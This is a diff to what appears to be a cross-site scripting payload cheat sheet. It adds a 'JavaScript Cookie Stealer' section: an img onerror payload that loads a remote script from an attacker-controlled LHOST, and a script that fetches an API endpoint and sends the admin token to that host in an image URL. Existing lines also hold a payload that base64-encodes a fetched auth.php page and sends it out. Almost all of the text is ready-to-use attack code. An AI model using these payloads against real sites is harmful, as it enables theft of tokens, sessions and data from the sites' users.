@@ -26,7 +26,7 @@
 
 #### Hypertext Markup Language (HTML) Injection
 
-```c
+```js
 <script>
 x=new XMLHttpRequest;
 x.onload=function(){
@@ -39,13 +39,35 @@ x.send();
 
 ### JavaScript (JS)
 
+### JavaScript Cookie Stealer
+
+```js
+<img src=1 onerror="this.remove(); var s=document.createElement('script'); s.src='http://<LHOST>/<FILE>.js'; document.body.appendChild(s);">
+```
+
+```js
+(function() {
+    fetch('/api/info')
+        .then(response => response.json())
+        .then(data => {
+            var token = data.adminToken || data.token || JSON.stringify(data);
+
+            var img = new Image();
+            img.src = 'http://<LHOST>/?token=' + encodeURIComponent(token);
+        })
+        .catch(err => {
+            console.error('Error fetching token:', err);
+        });
+})();
+```
+
 #### JavaScript (JS) Fetch Uniform Resource Locator (URL) and Base64 Encoding
 
-```c
+```js
 <script>fetch('http://<RHOST>/auth.php').then(r => r.text()).then(d => fetch("http://<LHOST>"+btoa(d)));</script>
 ```
 
-```c
+```js
 const Req1 = new XMLHttpRequest();
 Req1.open("GET", "http://<RHOST>/index.php", true);
 
